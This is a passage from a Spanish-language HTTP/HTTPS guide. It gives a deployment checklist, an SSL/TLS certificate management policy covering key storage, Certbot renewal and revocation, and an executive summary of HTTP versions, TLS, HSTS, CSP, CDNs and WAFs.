- [ ] Renovación automática de certificados (Let's Encrypt)
- [ ] Pruebas de carga (ab, h2load)
- [ ] Auditoría de seguridad (testssl.sh, SSL Labs)
- [ ] Plan de respuesta ante incidentes

**Política de gestión de certificados:**

```markdown
# Política de Gestión de Certificados SSL/TLS

## 1. Adquisición
- Proveedor autorizado: Let's Encrypt (servicios públicos), DigiCert/GlobalSign (corporativo)
- Algoritmo: RSA 2048-bit mínimo, ECDSA P-256 preferido
- Validación: DV (Domain Validation) para servicios web, OV/EV para e-commerce

## 2. Almacenamiento
- Claves privadas: Permisos 600, propietario root
- Directorio: /etc/ssl/private/ con acceso restringido
- Backup cifrado en almacenamiento seguro offline
- Nunca commitear claves en git

## 3. Despliegue
- Ambiente desarrollo: Certificados auto-firmados
- Ambiente staging: Let's Encrypt staging API
- Ambiente producción: Certificados válidos con CA confiable

## 4. Renovación
- Automatizada: Certbot con systemd timer (Let's Encrypt)
- Alertas: 30 días antes de expiración
- Pruebas: certbot renew --dry-run mensual

## 5. Revocación
- Criterios: Compromiso de clave privada, cambio de propietario, violación de política
- Procedimiento: certbot revoke + notificación a stakeholders
- Sustitución: Certificado nuevo emitido inmediatamente

## 6. Auditoría
- Escaneo trimestral: testssl.sh, SSL Labs
- Verificación de configuración TLS
- Revisión de logs de acceso a claves privadas
```

## Resumen Ejecutivo

**HTTP/HTTPS es la columna vertebral de la web moderna.** La transición de HTTP a HTTPS ya no es opcional: es obligatoria por seguridad, compliance, y SEO (Google penaliza sitios HTTP).

**Conceptos clave:**
1. **HTTP/1.1 → HTTP/2 → HTTP/3**: Evolución de rendimiento (multiplexing, QUIC)
2. **TLS 1.2/1.3 únicamente**: Protocolos anteriores vulnerables
3. **Let's Encrypt**: Certificados gratuitos automáticos
4. **HSTS**: Forzar HTTPS siempre
5. **CSP**: Prevenir XSS
6. **Load Balancing**: Alta disponibilidad y escalabilidad
7. **CDN**: Reducir latencia global
8. **WAF**: Protección contra ataques web (OWASP Top 10)

**En entorno empresarial**: Nginx/HAProxy para balanceo, Cloudflare/Akamai para CDN, Prometheus/Grafana para monitoreo, ModSecurity/Cloudflare WAF para seguridad.

**Próximos pasos**: Implementar HTTP/3 cuando soporte madure, monitorear logs con SIEM, automatizar security audits en CI/CD pipeline.
